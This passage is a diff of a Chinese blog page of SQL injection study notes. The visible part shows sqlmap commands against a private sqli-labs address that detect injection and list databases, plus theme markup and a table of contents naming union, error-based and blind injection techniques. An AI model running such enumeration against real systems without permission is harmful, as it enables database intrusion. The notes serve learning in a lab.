+<h3 id="基本检测"><a href="#基本检测" class="headerlink" title="基本检测"></a>基本检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测是否存在注入</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-1/?id=1&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-1/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-1/?id=1&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
 
@@ -437,14 +1298,14 @@ if (true) {
   input.setSelectionRange(0, 99999);
   document.execCommand("copy");
   document.body.removeChild(input);
-}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cHr1s's bolg</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/study/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>study<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>sql注入<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/web%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web安全<span class="tagsPageCount">4</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/cover/sql.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/11/05/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/5.png" onerror="onerror=null;src='/cover/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">next主题美化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/04/08/css-study/" title="CSS入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-08</div><div class="title">CSS入门</div></div></a></div><div><a href="/2025/04/08/html-study/" title="html入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-08</div><div class="title">html入门</div></div></a></div><div><a href="/2025/04/10/js/" title="js入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-10</div><div class="title">js入门</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/loading.gif" alt="status"/></div></div><div class="author-info__description">cHr1s的博客</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content"><h2>🎉欢迎<br></h2>
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cHr1s's bolg</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/study/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>study<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>sql注入<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/web%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web安全<span class="tagsPageCount">4</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/images/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/05/14/sqli-lib/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" onerror="onerror=null;src='/cover/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">sqli-labs 靶场实战记录</div></div></a></div><div class="next-post pull-right"><a href="/2026/05/15/sqlmap/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" onerror="onerror=null;src='/cover/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sqlmap使用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/04/08/css-study/" title="CSS入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-08</div><div class="title">CSS入门</div></div></a></div><div><a href="/2025/04/08/html-study/" title="html入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-08</div><div class="title">html入门</div></div></a></div><div><a href="/2025/04/10/js/" title="js入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-10</div><div class="title">js入门</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/loading.gif" alt="status"/></div></div><div class="author-info__description">cHr1s的博客</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content"><h2>🎉欢迎<br></h2>
 <p>本站托管于github, 加载缓慢请耐心等待，欢迎大家畅所欲言。</p>
 
 <hr style="border: 1px solid black; background-color: black;">
 
 <span id="jinrishici-sentence" style="font-size: 18px; font-style: italic;"></span>
 <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">SQL 注入学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 判断是否存在 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 判断闭合字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. 确定回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.5.</span> <span class="toc-text">5. 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. 查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.1.7.</span> <span class="toc-text">7. 查询字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.8.</span> <span class="toc-text">8. 查询数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.2.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">1.2.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-substr-%E9%99%90%E5%88%B6%E8%BE%93%E5%87%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">limit &#x2F; substr 限制输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">求数据库长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E6%AF%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.3.</span> <span class="toc-text">逐字母爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B%EF%BC%9Asecurity-%E5%BA%93"><span class="toc-number">1.3.4.</span> <span class="toc-text">完整示例：security 库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">库名第一位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E6%95%B0%E9%87%8F"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">查表数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">第一个表长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">第一个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">第二个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5-emails-%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">1.3.4.7.</span> <span class="toc-text">查 emails 表字段数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.4.8.</span> <span class="toc-text">查第一个字段长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">1.3.4.9.</span> <span class="toc-text">截取第一个字段第一位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">求数据库长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E6%AF%8D%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.4.3.</span> <span class="toc-text">逐字母爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B%EF%BC%9Asecurity-%E5%BA%93-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">完整示例：security 库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D-1"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">库名第一位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">查表数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">第一个表长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E5%AD%97%E6%AF%8D-1"><span class="toc-number">1.4.4.5.</span> <span class="toc-text">第一个表第一位字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5-emails-%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.4.4.6.</span> <span class="toc-text">查 emails 表字段数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%AC%AC%E4%B8%80%E4%BD%8D-1"><span class="toc-number">1.4.4.7.</span> <span class="toc-text">截取第一个字段第一位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E4%BD%BF%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">sqlmap 使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">基本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.5.2.</span> <span class="toc-text">获取数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8"><span class="toc-number">1.5.3.</span> <span class="toc-text">获取表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.5.4.</span> <span class="toc-text">获取字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.5.5.</span> <span class="toc-text">获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.5.6.</span> <span class="toc-text">常用参数</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL 注入学习笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/sql.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="SQL 注入学习笔记"/></a><div class="content"><a class="title" href="/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL 注入学习笔记">SQL 注入学习笔记</a><time datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/05/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/" title="next主题美化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/5.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="next主题美化"/></a><div class="content"><a class="title" href="/2025/11/05/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/" title="next主题美化">next主题美化</a><time datetime="2025-11-05T13:09:00.000Z" title="发表于 2025-11-05 21:09:00">2025-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/08/%E5%9F%BA%E4%BA%8EWindows%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" title="入侵检测系统配置"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/default.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="入侵检测系统配置"/></a><div class="content"><a class="title" href="/2025/06/08/%E5%9F%BA%E4%BA%8EWindows%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" title="入侵检测系统配置">入侵检测系统配置</a><time datetime="2025-06-08T15:30:10.000Z" title="发表于 2025-06-08 23:30:10">2025-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/10/js/" title="js入门"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="js入门"/></a><div class="content"><a class="title" href="/2025/04/10/js/" title="js入门">js入门</a><time datetime="2025-04-10T08:09:22.000Z" title="发表于 2025-04-10 16:09:22">2025-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/08/css-study/" title="CSS入门"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/1.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="CSS入门"/></a><div class="content"><a class="title" href="/2025/04/08/css-study/" title="CSS入门">CSS入门</a><time datetime="2025-04-08T01:09:22.000Z" title="发表于 2025-04-08 09:09:22">2025-04-08</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By cHr1s</div><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/hashiqi.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/basics/" style="font-size: 0.88rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 0.88rem;">ctf<sup>4</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 0.88rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 0.88rem;">study<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>1</sup></a><a 